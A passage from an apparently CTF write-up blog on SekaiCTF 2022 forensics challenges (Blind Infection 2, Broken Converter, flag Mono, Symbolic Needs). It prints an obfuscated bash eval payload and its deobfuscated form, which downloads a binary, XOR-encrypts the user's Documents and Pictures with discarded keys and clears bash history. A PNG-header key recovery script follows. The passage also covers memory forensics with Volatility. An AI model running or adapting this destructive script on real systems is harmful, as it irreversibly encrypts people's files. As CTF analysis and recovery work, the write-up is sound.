class="string">&#x27;;OBz=&#x27;</span> <span class="variable">$fi</span><span class="string">&#x27;;Tz=&#x27;</span>k, W<span class="string">&#x27;;pz=&#x27;</span>ies/<span class="string">&#x27;;iz=&#x27;</span>ange<span class="string">&#x27;;KBz=&#x27;</span>y.tx<span class="string">&#x27;;Mz=&#x27;</span>nent<span class="string">&#x27;;Yz=&#x27;</span> -q <span class="string">&#x27;;CBz=&#x27;</span>ures<span class="string">&#x27;;Lz=&#x27;</span>erma<span class="string">&#x27;;cz=&#x27;</span>gith<span class="string">&#x27;;cBz=&#x27;</span>y<span class="string">&#x27;;Az=&#x27;</span><span class="built_in">echo</span><span class="string">&#x27;;JBz=&#x27;</span>&gt; ke<span class="string">&#x27;;lz=&#x27;</span>les/<span class="string">&#x27;;wz=&#x27;</span>~/Do<span class="string">&#x27;;BBz=&#x27;</span>Pict<span class="string">&#x27;;Hz=&#x27;</span>iles<span class="string">&#x27;;hz=&#x27;</span>m/sc<span class="string">&#x27;;bBz=&#x27;</span>stor<span class="string">&#x27;;uz=&#x27;</span>file<span class="string">&#x27;;RBz=&#x27;</span>.txt<span class="string">&#x27;;XBz=&#x27;</span> <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="string">&#x27;;gz=&#x27;</span>t.co<span class="string">&#x27;;yz=&#x27;</span>nts/<span class="string">&#x27;;xz=&#x27;</span>cume<span class="string">&#x27;;Zz=&#x27;</span>http<span class="string">&#x27;;VBz=&#x27;</span><span class="keyword">done</span><span class="string">&#x27;;EBz=&#x27;</span><span class="keyword">do</span><span class="string">&#x27;;Gz=&#x27;</span>ur f<span class="string">&#x27;;HBz=&#x27;</span>rand<span class="string">&#x27;;kz=&#x27;</span>r-fi<span class="string">&#x27;;ZBz=&#x27;</span>.bas<span class="string">&#x27;;sz=&#x27;</span>or-f<span class="string">&#x27;;Ez=&#x27;</span> <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;Al&#x27;</span>;dz=<span class="string">&#x27;ubus&#x27;</span>;bz=<span class="string">&#x27;raw.&#x27;</span>;az=<span class="string">&#x27;s://&#x27;</span>;oz=<span class="string">&#x27;inar&#x27;</span>;LBz=<span class="string">&#x27;t&#x27;</span>;Kz=<span class="string">&#x27;e, p&#x27;</span>;ABz=<span class="string">&#x27;* ~/&#x27;</span>;Xz=<span class="string">&#x27;wget&#x27;</span>;Fz=<span class="string">&#x27;l yo&#x27;</span>;SBz=<span class="string">&#x27;rm k&#x27;</span>;GBz=<span class="string">&#x27;ssl &#x27;</span>;IBz=<span class="string">&#x27; 16 &#x27;</span>;mz=<span class="string">&#x27;mast&#x27;</span>;TBz=<span class="string">&#x27;ey.t&#x27;</span>;Vz=<span class="string">&#x27;re y&#x27;</span>;fz=<span class="string">&#x27;nten&#x27;</span>;Dz=<span class="string">&#x27;---&#x27;</span>\<span class="string">&#x27;&#x27;</span><span class="string">&#x27;;jz=&#x27;</span>o/xo<span class="string">&#x27;;qz=&#x27;</span>x86_<span class="string">&#x27;;rz=&#x27;</span>64/x<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">eval &quot;$Az$Bz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Dz$z$Az$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$z$Az$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Oz$z$Az$Bz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Cz$Dz$z$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$Hz$z$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$z$EBz$z$FBz$GBz$HBz$IBz$JBz$KBz$LBz$z$MBz$uz$NBz$OBz$PBz$uz$QBz$RBz$z$SBz$TBz$UBz$z$VBz$z$WBz$sz$Hz$z$Az$XBz$YBz$ZBz$aBz$bBz$cBz&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Looks like it’s obfuscated by defining a crap ton of environmental variables and evaluating the concatenated contents. To deobfuscate, simply change the <code>eval</code> term to <code>echo</code> to see what actually runs:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;---------------------------------------------------------&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;All your files are gone, permanently!!!&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Bring them back, We dare you!!!&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;---------------------------------------------------------&#x27;</span></span><br><span class="line">wget -q https://raw.githubusercontent.com/scangeo/xor-files/master/binaries/x86_64/xor-files</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> ~/Documents/* ~/Pictures/*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">openssl rand 16 &gt; key.txt</span><br><span class="line">xor-files -r <span class="variable">$file</span> <span class="variable">$file</span> key.txt</span><br><span class="line"><span class="built_in">rm</span> key.txt</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">rm</span> xor-files</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#x27;</span> &gt; ~/.bash_history</span><br></pre></td></tr></table></figure>
+
+<p>Let’s do a quick analysis. This script:</p>
+<ol>
+<li>Downloads a binary quietly</li>
+<li>For each file in the <code>Documents/</code> and <code>Pictures/</code> folder, it:<ul>
+<li>Generates a 16-byte key</li>
+<li>Performs a XOR operation with the key</li>
+<li>Removes the key (meaning the key is different every time)</li>
+</ul>
+</li>
+<li>Deletes the binary and clears the contents of <code>~/.bash_history</code></li>
+</ol>
+<p>We now know a simple XOR was used to encrypt <code>Pictures/</code>. However, we don’t know the keys, and it would take until the heat death of the universe to brute force 16 bytes. Additionally, we can’t extract utilize known-plaintext attacks on Part 1 since each key is unique. We’ll need a different solution.</p>
+<p>We know that:</p>
+<ol>
+<li>The files in <code>Pictures/</code> are in the <code>.png</code> format</li>
+<li>XOR is reversible if we have a key</li>
+<li>We do not have a key readily available</li>
+</ol>
+<p>But, there is a weakness! If we research a bit into the <code>.png</code> format, we learn that the first 16 bytes of a <code>.png</code> are always same:</p>
+<div><figure class="highlight text" style=""><table><tr><td class="code"><pre>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52
+Header Block                         IHDR Block</pre></td></tr></table></div>
+
+<p>With this, we can XOR the first 16 bytes of each encrypted <code>.png</code> with this as the key to obtain the original, unique key. We can now decrypt each picture with this Python script:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">&#x27;Pictures&#x27;</span>)</span><br><span class="line">header = binascii.unhexlify(<span class="string">b&#x27;89504E470D0A1A0A0000000D49484452&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;wget -q https://raw.githubusercontent.com/scangeo/xor-files/master/binaries/x86_64/xor-files&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">    path = <span class="string">&#x27;Pictures/&#x27;</span>+file</span><br><span class="line">    f = <span class="built_in">open</span>(path,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    first_16_bytes = f[:<span class="number">16</span>]</span><br><span class="line">    key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(header)):</span><br><span class="line">        key += <span class="built_in">chr</span>(header[i]^first_16_bytes[i]).encode(<span class="string">&#x27;iso-8859-1&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> k:</span><br><span class="line">        k.write(key)</span><br><span class="line">    os.system(<span class="string">&#x27;xor-files -r &#x27;</span>+path+<span class="string">&#x27; &#x27;</span>+path+<span class="string">&#x27; key.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;rm key.txt&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;rm xor-files&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Use the <code>strings</code> command on <code>flag.png</code> to flag the challenge.</p>
+<div class="text-flag no-highlight"><i class="fa-solid fa-flag"></i> <strong>Blind Infection 2</strong>: <code>SEKAI{D4R3_4CC3PT38_4N8_4U5T38}</code></div>
+
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h2 id="Broken-Converter" class="chal-title"><a href="#Broken-Converter" class="headerlink" title="Broken Converter"></a>Broken Converter</h2></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/553831"> <a target="_blank" rel="noopener" href="https://github.com/blueset">blueset</a><br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: forensics<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/sekaictf-2022/Assignment-broken.xps">Assignment-broken.xps</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" >
+                Miku has finally finished her assignment and is ready to submit - but for some reason, the school requires all assignments to be submitted as <code>.xps</code> files. Miku found a converter online and used the converted file for submission. The file looked good at first, but it seems as if there’s something broken in the converter. Can you help her figure out what's wrong?
+                
+            </div>
+        </div>
+    </div>
+    </div>
+
+<div class="text-info no-highlight"><i class="fa-solid fa-circle-info"></i> <strong>Note</strong>: This challenge shares the same file as <em>flag Mono</em>.</div>
+
+<p>Reading the Wikipedia page for <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Open_XML_Paper_Specification">Open XML Paper Specification</a>&#x2F;<code>.xps</code> files, we can see that <code>Assignment-broken.xps</code> is actually a <code>.zip</code> archive:</p>
+<blockquote>
+<p>An XPS file is a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ZIP_(file_format)" title="ZIP (file format)">ZIP</a> archive using the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Open_Packaging_Conventions" title="Open Packaging Conventions">Open Packaging Conventions</a>, containing the files which make up the document. These include an XML markup file for each page, text, <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Odttf" title="Odttf">embedded fonts</a>, raster images, 2D <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Vector_graphics" title="Vector graphics">vector graphics</a>, as well as the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Digital_rights_management" title="Digital rights management">digital rights management</a> information. The contents of an XPS file can be examined by opening it in an application which supports ZIP files.</p>
+</blockquote>
+<p>Renaming the file extension to <code>.zip</code> will provide us with some files:</p>
+<p><img src="/static/sekaictf-2022/zip.png" alt="Viewing the renamed `.xps` file in WinRAR"></p>
+<p>In <code>Resources/</code> we can find <code>02F30FAD-6532-20AE-4344-5621D614A033.odttf</code>, which is an “Obfuscated OpenType” file:</p>
+<p><img src="/static/sekaictf-2022/odttf.png" alt="Viewing `Resources/` file in WinRAR"></p>
+<p> The ODTTF <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ODTTF">Wikipedia</a> page states that <code>.odttf</code> files are obfuscated by performing a XOR operation on the first 32 bytes of the font file, using its GUID (or the filename) as the key:</p>
+<blockquote>
+<p>According to the source code of <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Okular" title="Okular">Okular</a> (see function <em>parseGUID()</em> and method <em>XpsFile::loadFontByName()</em>), the first 32 bytes of the font file are obfuscated by XOR using the font file name (a GUID). The rest of the file is normal OpenType.</p>
+</blockquote>
+<p>This is also mentioned in section 9.1.7.3 of the <a target="_blank" rel="noopener" href="https://www.ecma-international.org/wp-content/uploads/XPS-Standard.pdf">XPS Standard</a>:</p>
+<blockquote>
+<p>Perform an XOR operation on the first 32 bytes of the binary data of the obfuscated font part with the array consisting of the bytes referred to by the placeholders B37, B36, B35, B34, B33, B32, B31, B30, B20, B21, B10, B11, B00, B01, B02, and B03, in that order and repeating the array once. The result is a non-obfuscated font.</p>
+</blockquote>
+<p>Although you can totally create a XOR script and perform it manually, you can also find scripts online. <a target="_blank" rel="noopener" href="https://github.com/somanchiu/odttf2ttf">odttf2ttf</a> provides an online demo <a target="_blank" rel="noopener" href="https://somanchiu.github.io/odttf2ttf/js/demo">here</a>, which is a simple drag-and-drop with instant conversion:</p>
+<p><img src="/static/sekaictf-2022/conversion.png" alt="Conversion using odttf2ttf"></p>
+<p>Now that it’s deobfuscated, we can open the file in Windows Font Viewer. The phrase <code>GlYPHZ,W3|!.d0n&amp;&#125;</code> is visible at the top, but the rest of the flag isn’t properly ordered:</p>
+<p><img src="/static/sekaictf-2022/fontviewer.png" alt="Viewing unordered glyphs in default font viewer"></p>
+<p>However, opening the <code>.ttf</code> file in programs that sort by ASCII, such as <a target="_blank" rel="noopener" href="https://fontforge.org/">FontForge</a> or <a target="_blank" rel="noopener" href="https://fontdrop.info/">FontDrop!</a>, will yield a flag:</p>
+<p><img src="/static/sekaictf-2022/broken-converter-flag-fontforge.png" alt="Visible flag in program window for FontForge"></p>
+<div class="text-flag no-highlight"><i class="fa-solid fa-flag"></i> <strong>Broken Converter</strong>: <code>SEKAI{sCR4MBLeD_a5ci1-FONT+GlYPHZ,W3|!.d0n&amp;}</code></div>
+
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h2 id="flag-Mono" class="chal-title"><a href="#flag-Mono" class="headerlink" title="flag Mono"></a>flag Mono</h2></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/553831"> <a target="_blank" rel="noopener" href="https://github.com/blueset">blueset</a><br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: forensics<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 368<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/sekaictf-2022/Assignment-broken.xps">Assignment-broken.xps</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" >
+                When writing the assignment, Miku used a font called <strong>flag Mono</strong>. Despite it looking just like a regular monospaced font, it claims itself to be <strong>stylistic</strong> in various ways.<br />
+"Perhaps there's something special about it", Miku thought.
+                
+            </div>
+        </div>
+    </div>
+    </div>
+
+<div class="text-info no-highlight"><i class="fa-solid fa-circle-info"></i> <strong>Note</strong>: This challenge shares the same file as <em>Broken Converter</em>.</div>
+
+<p>If you inspect the font info in <a target="_blank" rel="noopener" href="https://fontforge.org/">FontForge</a> with <code>Ctrl</code> + <code>Shift</code> + <code>F</code>, you can see in the Lookup tab that four different “Style Sets” have been implemented into this font:</p>
+<p><img src="/static/sekaictf-2022/lookup.png" alt="Inspecting the &quot;Lookup&quot; tab in FontForge"></p>
+<p>These are called “OpenType Stylistic Sets”. According to its official Microsoft <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/typography/opentype/spec/features_pt#ssxx">documentation</a>:</p>
+<blockquote>
+<p>In addition to, or instead of, stylistic alternatives of individual glyphs […], some fonts may contain sets of stylistic variant glyphs corresponding to portions of the character set, e.g. multiple variants for lowercase letters in a Latin font.</p>
+</blockquote>
+<p>In FontForge you can actually view the ruleset for these styles with the <code>Edit Data</code> button. This is the ruleset for <code>ss01</code>:</p>
+<p><img src="/static/sekaictf-2022/ruleset.png" alt="Inspecting stylistic set ruleset $2 in FontForge"></p>
+<blockquote>
+<p>ampersand quotesingle | a @&lt;Single Substitution lookup 4&gt; | g<br>| f @&lt;Single Substitution lookup 4&gt; | l a g<br>ampersand quotesingle parenleft | g @&lt;Multiple Substitution lookup 5&gt; |<br>ampersand | l @&lt;Single Substitution lookup 4&gt; | a g</p>
+</blockquote>
+<p>Let’s test out typing <code>flag</code> on <a target="_blank" rel="noopener" href="https://fontdrop.info/">FontDrop!</a> and changing the stylistic set:</p>
+<p><img src="/static/sekaictf-2022/mono-flag.gif" alt="Changing stylistic sets on FontDrop!"></p>
+<div class="text-flag no-highlight"><i class="fa-solid fa-flag"></i> <strong>flag Mono</strong>: <code>SEKAI{OpenTypeMagicGSUBIsTuringComplete}</code></div>
+
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h2 id="Symbolic-Needs-1" class="chal-title"><a href="#Symbolic-Needs-1" class="headerlink" title="Symbolic Needs 1"></a>Symbolic Needs 1</h2></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://www.gravatar.com/avatar/00000000000000000000000000000007?d=identicon&s=256"> <a target="_blank" rel="noopener" href="#">Battlemonger</a><br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: forensics<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 467<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1l4PHepz1TbogHpAOxH356HxzlxTNuGqp/edit">memdump</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" >
+                We recently got hold of a cryptocurrency scammer and confiscated his laptop.<br />
+Analyze the memdump. Submit the string you find wrapped with SEKAI{}.
+                
+            </div>
+        </div>
+    </div>
+    </div>
+
+<p>Inflating the <code>.zip</code>, we are given a <code>.mem</code> memory dump of a machine of  an unknown operating system. We will be using the <a target="_blank" rel="noopener" href="https://www.volatilityfoundation.org/">Volatility 3</a> framework to analyze it.</p>
+<p>Firstly, clone the <a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility3.git">repository</a> on GitHub:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>git <span class="built_in">clone</span> https://github.com/volatilityfoundation/volatility3.git
+<span class="meta prompt_">$ </span><span class="built_in">cd</span> volatility3</pre></td></tr></table></div>
+
+<p>Since we’ll need to find a debugging package for this memory dump later, we need to run the <code>banner</code> command to identify the exact operating system, version and kernel:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">$ </span>python3 vol.py -f dump.mem banner
+Volatility 3 Framework 2.3.1
+Progress:  100.00        PDB scanning finished                      
+Offset  Banner
+
+0x42400200  Linux version 5.15.0-43-generic (buildd@lcy02-amd64-076) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #46-Ubuntu SMP Tue Jul 12 10:30:17 UTC 2022 (Ubuntu 5.15.0-43.46-generic 5.15.39)
+0x437c3718  Linux version 5.15.0-43-generic (buildd@lcy02-amd64-076) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #46-Ubuntu SMP Tue Jul 12 10:30:17 UTC 2022 (Ubuntu 5.15.0-43.46-generic 5.15.39)9)</pre></td></tr></table></div>
+
+<p>This identifies the following:</p>
+<ul>
+<li><strong>OS</strong>: Ubuntu 22.04</li>
+<li><strong>Kernel</strong>: Linux version 5.15.0-43-generic</li>
+</ul>
+<p><strong>Note</strong>: Since these are very recent versions, there were no readily available Volatility profiles. Honestly, I couldn’t make Volatility 2 work with Ubuntu 22 even after successful profile creation (<code>KeyError: &#39;DW_AT_data_member_location&#39;</code>). Let me know if you were able to, since everyone’s learning! :)</p>
+<p><strong>Profile Creation + Symbol Table:</strong></p>
+<p>In order to run Volatility plugins we need to build a <a target="_blank" rel="noopener" href="https://volatility3.readthedocs.io/en/latest/symbol-tables.html#">symbol table</a> in the <code>.json</code> format. They can be generated from <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/DWARF">DWARF</a> files using the <a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/dwarf2json">dwarf2json</a> tool. The hardest part is probably finding the kernel with debugging symbols for Linux version <code>5.15.0-43-generic</code>. A complete list is available <a target="_blank" rel="noopener" href="http://ddebs.ubuntu.com/pool/main/l/linux/">here</a>, but <a target="_blank" rel="noopener" href="http://ddebs.ubuntu.com/pool/main/l/linux/linux-image-unsigned-5.15.0-43-generic-dbgsym_5.15.0-43.46_amd64.ddeb"><code>linux-image-unsigned-5.15.0-43-generic-dbgsym_5.15.0-43.46_amd64.ddeb</code></a> is the version we need. After inflating the archive, the relevant file we need is the <code>vmlinux-5.15.0-43-generic</code> DWARF located in <code>usr/lib/debug/boot</code>.</p>
+<p>Next, we’ll clone the <a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/dwarf2json">dwarf2json</a> tool from the Volatility repository and build it:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>git <span class="built_in">clone</span> https://github.com/volatilityfoundation/dwarf2json  
+<span class="meta prompt_">$ </span><span class="built_in">cd</span> dwarf2json 
+<span class="meta prompt_">$ </span>go build  </pre></td></tr></table></div>
+
+<p>Finally, we can run:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>dwarf2json linux --elf vmlinux-5.15.0-43-generic > ubuntu22.json</pre></td></tr></table></div>
+
+<p>Copy the symbol table to <code>volatility3/volatility3/symbols/linux</code>, and your profile should be set up!</p>
+<p>Once we have a valid <code>symbols.json</code>, we can run Volatility 3 plugins. The first one we always run is <code>linux.bash</code>, to display bash history:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">$ </span>python3 vol.py -f dump.mem linux.bash
+Volatility 3 Framework 2.3.1
+Progress:  100.00        Stacking attempts finished                 
+PID Process CommandTime Command
+
+1863    bash    2022-08-29 13:45:56.000000    72.48.117.53.84.48.110.95.119.51.95.52.114.51.95.49.110.33.33.33</pre></td></tr></table></div>
+
+<p>Those are easily identifiable as ASCII codes. Convert <code>72 48 117 53 84 48 110 95 119 51 95 52 114 51 95 49 110 33 33 33</code> to text and get the flag:</p>
+<div class="text-flag no-highlight"><i class="fa-solid fa-flag"></i> <strong>Symbolic Needs 1</strong>: <code>SEKAI{H0u5T0n_w3_4r3_1n!!!}</code></div>
+
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h2 id="Symbolic-Needs-2" class="chal-title"><a href="#Symbolic-Needs-2" class="headerlink" title="Symbolic Needs 2"></a>Symbolic Needs 2</h2></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://www.gravatar.com/avatar/00000000000000000000000000000007?d=identicon&s=256"> <a target="_blank" rel="noopener" href="#">Battlemonger</a><br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: forensics<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 482<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1l4PHepz1TbogHpAOxH356HxzlxTNuGqp/edit">memdump</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" >
+                Recover the private key of the wallet address <code>0xACa5872e497F0Cc626d1E9bA28bAEC149315266e</code>. Submit the key wrapped with <code>SEKAI{}</code>.
+                
+            </div>
+        </div>
+    </div>
+    </div>
+
+<p>Let’s follow up from the last proglem with the <code>linux.psaux</code> plugin, to gather and display all processes:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 vol.py -f dump.mem linux.psaux
+Volatility 3 Framework 2.3.1
+Progress:  100.00        Stacking attempts finished                 
+PID PPID    COMM    ARGS
+...
+1731    985 gsd-xsettings    /usr/libexec/gsd-xsettings
+1787    985 ibus-x11    /usr/libexec/ibus-x11
+1845    985 gnome-terminal- /usr/libexec/gnome-terminal-server
+1863    1845    bash    bash
+1878    1863    ncat    ncat -lvnp 1234 -c echo N4GQ2CQAAAAAAEFG5JRPEAIAADRQAAAAAAAAAAAAAAAAAAAAAAAAACIAAAAEAAAAABZ6QAAAABSAAZABNQAFUAD2A5SQA2QBMQBBSAC2AJLQA3QLAEAACAABABSQGZADQMAQCADFASBQAAIALEAGOAC2AVSQMZAEMQCYGAUPBZNAOZIHUAEKCAFABGQQAWQFK4AGIAIEAACABAYDAEAG4CBRABZS65YBAEAACAABABMQAAIAMQDFUCTFBNSQVAYBMQDWIAMFAIMQAWQKMUGGKCVABVSQ4ZIKQMAWICDFBZSQVAYBMQEBMAAYAALQBIIBQMAVUCTHABNA6ZIQMQAGKDTFBKBQCZAIQMBUIAC5CRNBCZIPUAJGKBLFCNSQUZIRMUIWICAXACCQEGIAMQDYGATEAIMAAGIAUEAQCADRLFSQGZAJQMAQCADEAFJQAKIK5EAAAAAAJ3UQCAAAAB5BQVLTMFTWKORAFYXXOYLMNRSXIIDQMFZXG53POJSHUDLCNFYDGOLMNFZXILTUPB2NUALSNQKAAAAAABS6KHWNHGMBH4AWTJ3BE3XKCYFWPVQQSR6WWFSHC2WEUE3P5AP7G46OA3IBWAIA5EBAAAAA5EGAAAAA3ICVO4TPNZTSSFG2ANZXS462ARQXEZ3W3IEHAYLTON3W64TE3ICXA4TJNZ2NUBDFPBUXJWQFO5XXEZDT3ICG64DFN3NACZW2ARZGKYLE3IFHG4DMNF2GY2LOMVZ5UBDDN5SGLWQDMJUW5WQDON2HFWQFPJTGS3DM3IBWYZLO3IEG23TFNVXW42LD3ICXEYLOM5S5UALJ3IDGC4DQMVXGJWQDNFXHJKIAOINQAAAAOINQAAAA7IEHIZLTOQZC44DZ3IEDY3LPMR2WYZJ6AEAAAADTEIAAAAAIAABAEDQBAYAQQAIIAECAGDACBYARZ7YEAMIAGIQBAQBRIARGAEGAE=== | base32 -d > file.pyc
+1886    1147    update-notifier update-notifier
+1911    1863    sudo    sudo insmod LiME/src/lime-5.15.0-43-generic.ko path=dump.mem format=lime
+1918    1911    sudo    sudo insmod LiME/src/lime-5.15.0-43-generic.ko path=dump.mem format=lime
+...</pre></td></tr></table></div>
+
+<p>It looks like the scammer was serving some base32 through Netcat. We also notice that it’s piped into a <code>.pyc</code> file, which is Python bytecode.</p>
+<p>Run the command <code>echo [PUT YOUR BASE32 HERE] | base32 -d &gt; file.pyc</code> to convert this base32 into a binary. Let’s run the <code>.pyc</code> with Python3:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 file.pyc 
+Usage: ./wallet password</pre></td></tr></table></div>
+
+<p>Passing a random argument results in a <code>FileNotFoundError</code>:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 file.pyc password
+Traceback (most recent call last):
+  File "test2.py", line 12, in <module>
+FileNotFoundError: [Errno 2] No such file or directory: 'bip39list.txt'</pre></td></tr></table></div>
+
+<p>We can find this wordlist in the <a target="_blank" rel="noopener" href="https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt">bitcoin&#x2F;bips</a> repository. If you run the binary again with the same argument it just outputs “Wrong”. We’ll need to disassemble this.</p>
+<p>Disassemble the bytecode with the <code>dis</code> module:</p>
